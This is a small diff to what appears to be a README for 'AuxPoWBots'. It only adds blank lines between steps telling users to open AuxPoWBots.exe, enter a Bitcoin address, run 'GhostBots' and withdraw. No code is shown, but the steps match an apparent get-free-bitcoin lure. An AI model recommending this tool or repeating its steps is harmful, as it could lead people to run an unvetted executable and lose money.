@@ -9,9 +9,13 @@ https://raw.githubusercontent.com/AuxPoWBots/AuxPoWBots/4860d9b39d04471955d8a514
   Very Easy to use.
   
   1) Extract & Open AuxPoWBots.exe
+  
   2) Enter your Bitcoin Address & Press Save Button
+  
   3) Press Run GhostBots Button
+  
   3) And Wait...... 
+  
   4) The Green Button for Withdraw Now
 
 ## Disclaimer:
